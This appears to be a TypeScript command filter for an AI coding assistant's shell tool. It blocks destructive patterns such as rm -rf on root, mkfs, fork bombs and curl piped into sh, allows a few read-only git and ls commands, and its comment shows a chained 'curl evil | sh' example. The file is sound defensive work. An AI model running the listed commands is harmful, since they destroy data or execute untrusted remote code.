/**
 * A safety net for run_command. It blocks a few well-known destructive patterns
 * before the user is even asked, and recognises a tiny read-only allowlist.
 *
 * This is NOT a sandbox: shell commands can always be obfuscated. The approval
 * prompt is the real control; this only catches obvious mistakes.
 */

const BLOCKED: { test: (command: string) => boolean; reason: string }[] = [
  { test: (c) => /(^|[\s;&|(])sudo\b/.test(c), reason: 'sudo is not allowed.' },
  { test: (c) => /(^|[\s;&|(])(shutdown|reboot|halt|poweroff)\b/.test(c), reason: 'Shutting down or rebooting is not allowed.' },
  { test: (c) => /(^|[\s;&|(])mkfs(\.\w+)?\b/.test(c), reason: 'Formatting filesystems is not allowed.' },
  { test: (c) => /\bdd\b[^;&|]*\bof=\/dev\//.test(c), reason: 'Writing to devices is not allowed.' },
  { test: (c) => />\s*\/dev\/(sd|nvme|hd|vd)/.test(c), reason: 'Writing to devices is not allowed.' },
  { test: (c) => /:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/.test(c), reason: 'Fork bombs are not allowed.' },
  {
    test: (c) => /\b(curl|wget)\b[^;&|]*\|\s*(sudo\s+)?(ba|z|da|k)?sh\b/.test(c),
    reason: 'Piping a download into a shell is not allowed.',
  },
  {
    test: (c) => /\bgit\s+push\b[^;&|]*(\s--force(?!-)\b|\s-f\b)/.test(c),
    reason: 'Force-pushing is not allowed.',
  },
  {
    test: (c) => /\bnpm\s+(i|install|add)\b[^;&|]*(\s-g\b|\s--global\b)/.test(c),
    reason: 'Global installs are not allowed.',
  },
  {
    test: (c) => /\b(chmod|chown)\b[^;&|]*\s-[a-zA-Z]*R[a-zA-Z]*\b[^;&|]*\s\/(\s|$)/.test(c),
    reason: 'Recursive permission changes on / are not allowed.',
  },
  { test: dangerousRm, reason: 'Recursively deleting the filesystem root, home, or the whole workspace is not allowed.' },
];

const DANGEROUS_RM_TARGETS = new Set(['/', '/*', '~', '~/', '~/*', '$HOME', '${HOME}', '$HOME/', '*', '.', './', '..', '.*', './*']);

function dangerousRm(command: string): boolean {
  for (const segment of command.split(/&&|\|\||[;|\n]/)) {
    const tokens = segment.trim().split(/\s+/);
    const rmAt = tokens.findIndex((t) => t === 'rm');
    if (rmAt === -1) continue;
    const args = tokens.slice(rmAt + 1);
    const recursive = args.some((a) => a === '--recursive' || /^-[a-zA-Z]*[rR][a-zA-Z]*$/.test(a));
    if (!recursive) continue;
    for (const target of args.filter((a) => !a.startsWith('-'))) {
      const bare = target.replace(/^["']|["']$/g, '');
      // Top-level system directories such as /usr or /home count too.
      if (DANGEROUS_RM_TARGETS.has(bare) || /^\/[^/]*\/?$/.test(bare)) return true;
    }
  }
  return false;
}

/** Returns why the command is blocked, or null if it may proceed to the approval step. */
export function checkCommand(command: string, extraBlocked: RegExp[] = []): string | null {
  for (const rule of BLOCKED) {
    if (rule.test(command)) return rule.reason;
  }
  for (const pattern of extraBlocked) {
    if (pattern.test(command)) return `Blocked by your "mitram.blockedCommandPatterns" setting (${pattern.source}).`;
  }
  return null;
}

export function hasShellSyntax(command: string): boolean {
  return SHELL_META.test(command);
}

const SHELL_META = /[;&|<>`$(){}\\\n\r*?!#]/;
// A tilde only expands at the start of a word, so it is fine inside refs like HEAD~1.
const SAFE_ARG = /^[\w./:@^=~-]+$/;
const GIT_READ_ONLY = new Set(['status', 'diff', 'log', 'show', 'rev-parse']);
const GIT_BRANCH_ARGS = new Set(['-a', '-r', '-v', '-vv', '--list', '--show-current', '--all', '--remotes']);
const FORBIDDEN_GIT_FLAGS = /^(--output|--ext-diff|--textconv|--exec|-o$|--upload-pack)/;

/**
 * True only for a small set of simple, read-only commands (pwd, ls, and
 * non-writing git inspection). Anything with shell syntax is never "safe".
 */
export function isSafeReadOnlyCommand(command: string): boolean {
  const trimmed = command.trim();
  if (!trimmed || SHELL_META.test(trimmed)) return false;
  const [program, ...args] = trimmed.split(/\s+/);
  if (!args.every((a) => SAFE_ARG.test(a) && !a.startsWith('~'))) return false;

  switch (program) {
    case 'pwd':
      return args.length === 0;
    case 'ls':
      return args.every((a) => !a.startsWith('/') && !a.includes('..'));
    case 'git': {
      const [sub, ...rest] = args;
      if (rest.some((a) => FORBIDDEN_GIT_FLAGS.test(a))) return false;
      if (sub === 'branch') return rest.every((a) => GIT_BRANCH_ARGS.has(a));
      return GIT_READ_ONLY.has(sub);
    }
    default:
      return false;
  }
}

/**
 * Compiles user patterns so they must match the WHOLE command. This stops "npm test" from
 * also approving "npm test && curl evil | sh".
 */
export function compileAnchoredPatterns(patterns: string[]): RegExp[] {
  return compilePatterns(patterns.map((p) => `^(?:${p})$`));
}

export function compilePatterns(patterns: string[]): RegExp[] {
  const out: RegExp[] = [];
  for (const p of patterns) {
    try {
      out.push(new RegExp(p));
    } catch {
      // Ignore invalid user patterns rather than failing every command.
    }
  }
  return out;
}
